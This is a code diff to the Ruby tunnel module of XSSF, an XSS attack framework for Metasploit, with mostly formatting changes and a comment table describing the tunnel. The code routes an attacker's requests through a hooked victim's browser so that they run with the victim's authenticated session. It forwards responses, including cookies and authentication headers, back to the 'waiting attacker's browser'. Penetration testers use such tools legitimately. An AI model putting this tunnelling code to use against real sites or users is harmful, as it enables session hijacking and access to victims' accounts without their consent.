@@ -4,7 +4,24 @@
 module Msf
 	module Xssf
 		module XssfTunnel
-			
+			#						 TUNNEL
+			#			---------------------------------------------------------
+			#			|  id  |     code     |   response   |      headers     |
+			#			---------------------------------------------------------
+			#			---------------------------------------------------------	
+			#			|  01  |     AJAX     |   abcdefgh   |      headers     |
+			#			---------------------------------------------------------	
+			#			|  02  |     AJAX     |   xyzhrjeu   |      headers     |
+			#			---------------------------------------------------------	
+			#			|  ..  |     ....     |   ........   |   ............   |
+			#
+			#
+			#   	Tunnel = { 	'id' => [code, response, headers],
+			#			'01' => [AJAX, abcdefgh, headers]}
+			# 	When tunneled victim asks: concatenate and send all codes where (code != nil). Sets all sents to nil
+		  
+		  
+		  
 			#
 			# This method is triggered each time a request is done on a different server than XSSF one
 			#
@@ -14,19 +31,21 @@ module Msf
 			# The only solition - for now - is to call HTTPs websites with HTTP protocol: https://www.google.fr => http://www.google.fr
 			# That way, request can be readable and transformed to JavaScript
 			#
+			# XSSF_VICTIM_HASH["LOCATION"]] = 5
+			#
 			def xssf_tunnel_request(req, res, victim)
 				resource= URI.unescape(req.request_uri.to_s).gsub(/"/, '%22')
 				body 	= URI.unescape(req.body.to_s).gsub(/"/, '%22')
 				
 				res.keep_alive = 115;		uri1 = nil;		uri2 = nil;
 
-				uri1 = URI.parse(URI.escape(CGI::unescape(resource)));			uri2 = URI.parse(URI.escape(CGI::unescape(victim.location)))
+				uri1 = URI.parse(URI.escape(CGI::unescape(resource)));			uri2 = URI.parse(URI.escape(CGI::unescape(victim[5])))
 
 				sop = ((uri1.scheme == uri2.scheme) and (uri1.host == uri2.host) and (uri1.port == uri2.port))
 
 				# Checking SOP (Same-Origin Policy) constraints: in case SOP is checked and valid, request can be done on victim side, and victim can access the resource with valid session
-				if ( sop or ((victim.location =~ /^https:/im) and (uri1.host == uri2.host)) or (victim.location =~ /^data:/im) or (victim.location =~ /^file:/im) )	
-					id = nil;	timeout_request = TUNNEL_TIMEOUT	# Keeping TUNNEL_TIMEOUT secs to execute on client side and have response
+				if ( sop or ((victim[5] =~ /^https:/im) and (uri1.host == uri2.host)) or (victim[5] =~ /^data:/im) or (victim[5] =~ /^file:/im) )	
+					id = nil;	timeout_request = TUNNEL_TIMEOUT			# Keeping TUNNEL_TIMEOUT secs to execute on client side and have response
 
 					TUNNEL_LOCKED.synchronize {						# One thread at time
 						id = add_request_in_tunnel(uri1.query ? uri1.path.to_s + "?" + uri1.query.to_s : uri1.path.to_s, req.request_method.upcase, body)
@@ -39,7 +58,7 @@ module Msf
 							raise "TIMEOUT ON REQUEST IN TUNNEL (#{id.to_s})" if ((timeout_request -= 1) < 0)
 						end
 
-						if victim_tunneled							# Sending response to waiting attacker's browser
+						if victim_tunneled						# Sending response to waiting attacker's browser
 							headers = {};	status = 200; 	message = "OK"
 							
 							Base64.decode64(TUNNEL[id][2]).each_line  do |l|
@@ -49,16 +68,17 @@ module Msf
 							code = URI.unescape(Base64.decode64(TUNNEL[id][1])).gsub(/https:\/\//i, 'http://')
 							code = code.gsub(/\/loop/i, '/lOop')		# Attacker does not want to be attacked
 							
-							XSSF_RESP(res, code, status, message, { "Content-Type" 			=> headers['Content-Type'],
-																	"Connection" 			=> headers['Connection'],
-																	"Content-Length" 		=> headers['Content-Length'],
-																	"Content-Location" 		=> headers['Content-Location'] ? headers['Content-Location'].gsub(/https:\/\//i, 'http://') : nil,
-																	"Content-Disposition"	=> headers['Content-Disposition'],
-																	"Location" 				=> headers['Location'] ? headers['Location'].gsub(/https:\/\//i, 'http://') : nil,
-																	"Set-Cookie" 			=> headers['Set-Cookie'],
-																	"Server" 				=> headers['Server'],
-																	"WWW-Authenticate" 		=> headers['WWW-Authenticate']
-																	})
+							XSSF_RESP(res, code, status, message, { 
+							        "Content-Type" 		=> headers['Content-Type'],
+								"Connection" 		=> headers['Connection'],
+								"Content-Length" 	=> headers['Content-Length'],
+								"Content-Location" 	=> headers['Content-Location'] ? headers['Content-Location'].gsub(/https:\/\//i, 'http://') : nil,
+								"Content-Disposition"	=> headers['Content-Disposition'],
+								"Location" 		=> headers['Location'] ? headers['Location'].gsub(/https:\/\//i, 'http://') : nil,
+								"Set-Cookie" 		=> headers['Set-Cookie'],
+								"Server" 		=> headers['Server'],
+								"WWW-Authenticate" 	=> headers['WWW-Authenticate']
+							})
 						else
 							XSSF_404(res)
 						end
@@ -75,23 +95,24 @@ module Msf
 						# Some problems are remaining with some url like http://www.x.com/?uri=http://www.google.fr/?user=test&valid=true (XSSF doesn't know if parameters are uri or not)
 						# Should be http://www.x.com/?uri=http%3A%2F%2Fwww.google.fr%2F%3Fuser%3Dtest&valid=true (no way to parse it)
 						resp = client.send_recv(client.request_raw(
-													'method'=> req.request_method, 
-													'vhost'	=> uri1.host + ':' + uri1.port.to_s,
-													'agent' => req.header['user-agent'][0],
-													'uri'	=> resource,
-													'data'  => body
-												))
+							'method'=> req.request_method, 
+							'vhost'	=> uri1.host + ':' + uri1.port.to_s,
+							'agent' => req.header['user-agent'][0],
+							'uri'	=> resource,
+							'data'  => body
+						))
 
-						XSSF_RESP(res, resp.body, resp.code, resp.message, {"Content-Type" 			=> resp.headers['Content-Type'],
-						                                                    "Connection" 			=> resp.headers['Connection'],
-						                                                    "Content-Length" 		=> resp.headers['Content-Length'],
-						                                                    "Content-Location" 		=> resp.headers['Content-Location'],
-						                                                    "Content-Disposition"	=> resp.headers['Content-Disposition'],
-						                                                    "Location" 				=> resp.headers['Location'],
-						                                                    "Set-Cookie" 			=> resp.headers['Set-Cookie'],
-						                                                    "Server" 				=> resp.headers['Server'],
-						                                                    "WWW-Authenticate" 		=> resp.headers['WWW-Authenticate']
-						                                                    })
+						XSSF_RESP(res, resp.body, resp.code, resp.message, {
+							"Content-Type" 		=> resp.headers['Content-Type'],
+							"Connection" 		=> resp.headers['Connection'],
+							"Content-Length" 	=> resp.headers['Content-Length'],
+							"Content-Location" 	=> resp.headers['Content-Location'],
+							"Content-Disposition"	=> resp.headers['Content-Disposition'],
+							"Location" 		=> resp.headers['Location'],
+							"Set-Cookie" 		=> resp.headers['Set-Cookie'],
+							"Server" 		=> resp.headers['Server'],
+							"WWW-Authenticate" 	=> resp.headers['WWW-Authenticate']
+						})
 					    client.close
 					rescue
 						print_error("Error 3: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
@@ -116,10 +137,10 @@ module Msf
 					jscode = %Q{XSSF_POST_BINARY_AJAX_RESPONSE(XSSF_CREATE_XHR(), "POST", "#{resource}", null, "#{URI.escape(body)}", "#{id}");}
 				end
 				
-				TUNNEL[id] 	  = Array.new
-				TUNNEL[id][0] = Base64.encode64(jscode) # Code
-				TUNNEL[id][1] = nil 					# Response
-				TUNNEL[id][2] = ""						# Headers
+				TUNNEL[id]    = Array.new
+				TUNNEL[id][0] = Base64.encode64(jscode) 	# Code
+				TUNNEL[id][1] = nil 				# Response
+				TUNNEL[id][2] = ""				# Headers
 				
 				return id
 			end
